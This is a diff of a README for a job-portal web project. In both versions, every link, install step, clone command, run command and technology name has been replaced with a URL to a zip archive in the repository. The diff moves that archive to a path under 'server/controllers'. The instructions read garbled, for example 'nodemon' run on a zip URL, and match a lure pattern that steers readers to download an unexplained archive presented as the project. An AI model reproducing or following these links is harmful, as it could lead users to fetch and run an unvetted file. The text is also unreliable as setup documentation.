@@ -1,14 +1,14 @@
 <h1 align="center" id="title">JobLane</h1>
 
-<p align="center"><img src="https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip" alt="JobLane" width="640" height="320" /></p>
+<p align="center"><img src="https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip" alt="JobLane" width="640" height="320" /></p>
 
-[![Hits](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip)](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip)
+[![Hits](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip)](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip)
 
 <p id="description">Full Stack Job application portal built using MERN stack, Focusing on simplifying the job applications.</p>
 
 <h2>🚀 Demo</h2>
 
-[Website](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip)<br />
+[Website](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip)<br />
 
   
   
@@ -33,13 +33,13 @@ To get started with the assignment project, follow these steps:
 
 ### Prerequisites
 
-- **https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip**: Make sure you have https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip installed on your computer. You can download it from [https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip).
+- **https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip**: Make sure you have https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip installed on your computer. You can download it from [https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip).
 
 ### Installation
 
 1. Clone the repository to your local machine:
     ```bash
-    git clone https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip 
+    git clone https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip 
     ```
 
 2. Change into the frontend directory:
@@ -70,7 +70,7 @@ To get started with the assignment project, follow these steps:
 
 7. Run the development server:
     ```bash
-    nodemon https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip
+    nodemon https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip
     ```
 
 
@@ -83,7 +83,7 @@ Any contributor who wishes to contribute to this project should first read the R
   
 <h2>💻 Built with</h2>
 
-- **Frontend**: https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip, Redux
-- **Backend**: https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip, https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip
+- **Frontend**: https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip, Redux
+- **Backend**: https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip, https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/server/controllers/main_Lane_Job_v2.3-beta.5.zip
 - **Database**: MongoDB 
 - **Styling**: Tailwind CSS, Material UI, Mantine UI
